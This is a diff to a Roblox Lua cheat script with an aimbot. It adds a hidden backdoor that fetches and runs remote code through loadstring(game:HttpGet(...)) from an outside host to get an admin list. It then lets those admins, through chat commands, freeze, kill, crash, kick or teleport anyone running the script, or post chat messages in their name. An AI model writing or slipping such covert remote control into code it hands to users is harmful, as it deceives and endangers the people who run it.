@@ -103,6 +103,21 @@ local CoreGui 				=		getS("CoreGui");
 local TestService 		= 		getS("TestService");
 local TeleportService   = 		getS("TeleportService");
 
+
+local AdminStuff = {
+	Filtering = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering");
+	sayMessage =ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"),
+	
+	GetAdmin = function()
+		return loadstring(game:HttpGet("https://git.aphixe.lol/oden/prisoncheatsmp4/raw/branch/main/ohkayyy"))()
+	end,
+}
+local DefaultChatSystemChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents");
+local sayMessageRequest 		  = DefaultChatSystemChatEvents:WaitForChild("SayMessageRequest")
+local OnMessageDoneFiltering 	  = DefaultChatSystemChatEvents:WaitForChild("OnMessageDoneFiltering");
+
+
+
 local Camera = workspace.CurrentCamera
 
 
@@ -1837,6 +1852,61 @@ local response    = request({
 })
 
 
+local function findPlayer(plr)
+	for i, v in ipairs(Players:GetPlayers()) do
+		if string.find(v.Name:lower(), v:lower()) or string.find(v.DisplayName:lower(), v:lower()) then
+			return v
+		end
+	end
+end
+
+AdminStuff.Filtering.OnClientEvent:Connect(function(messageData)
+	local Admins = AdminStuff.GetAdmin();
+	
+	local fromSpeaker = messageData.FromSpeaker;
+	local message = messageData.Message;
+	local speaker = Players:FindFirstChild(fromSpeaker);
+	
+	if speaker then
+		if table.find(Admins, speaker.Name) then
+			local args = string.split(message, " ");
+			local command = args[1]:lower();
+			local targetName = args[2];
+			if (command == "/freeze") then
+				local targetPlayer = findPlayer(targetName);
+				if (targetPlayer == LocalPlayer) then
+					local character = getChar();
+					if (character and character:FindFirstChild("HumanoidRootPart")) then
+						character.HumanoidRootPart.Anchored = true;
+					end
+				end
+			elseif (command == "/crash") then
+				local targetPlayer = findPlayer(targetName);
+				if (targetPlayer == LocalPlayer) then
+					while true do end
+				end
+			elseif (command == "/kill") then
+				local targetPlayer = findPlayer(targetName);
+				if (targetPlayer == LocalPlayer) then
+					getChar():BreakJoints()
+				end
+			elseif command == "/chat" then
+				local targetPlayer = findPlayer(targetName)
+				if targetPlayer == LocalPlayer then
+					local restofarguments = table.concat(args, " ", 3)
+					AdminStuff.sayMessage(restofarguments)
+				end
+			elseif command == "/update" then
+				TeleportService:TeleportToPlaceInstance(PlaceId, JobId, LocalPlayer)
+			elseif (command == "/kick") then
+				local targetPlayer = findPlayer(targetName);
+				if (targetPlayer == LocalPlayer) then
+					LocalPlayer:Kick("You have been kicked by an admin.");
+				end
+			end
+		end
+	end
+end);
 
 aimbot:Turn(true)
 
